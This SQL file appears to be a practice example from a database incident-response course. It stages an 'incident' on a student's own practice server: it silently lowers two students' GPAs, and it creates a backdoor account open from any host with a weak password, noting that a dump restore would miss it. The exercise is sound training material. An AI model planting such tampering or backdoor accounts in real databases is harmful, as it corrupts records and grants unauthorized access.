-- Worked example of an incident that obeys every Round 5 rule. PRACTICE ONLY.
-- It is written for the made-up student ID 0000000. To try it on your own server:
--     sed "s/0000000/$ID/g" /work/examples/incident_example.sql | mysql reg_$ID
-- (inside the container, after ID=<your student ID>)
--
-- Your own incident.sql must have a different effect from this one.
--
-- Change 1, menu type "silent value change": lower the GPA of two students.
--   Row counts stay the same. Targets are picked by a query, not by hard-coded IDs.
UPDATE reg_0000000.students
   SET gpa = gpa - 0.25
 WHERE gpa >= 2.25
 ORDER BY student_id
 LIMIT 2;

-- Change 2, menu type "privilege tampering": a backdoor account.
--   A single-database dump does not contain accounts, so restoring the dump misses this.
CREATE USER 's0000000_backdoor'@'%' IDENTIFIED BY 'letmein-2026';
GRANT SELECT ON reg_0000000.* TO 's0000000_backdoor'@'%';
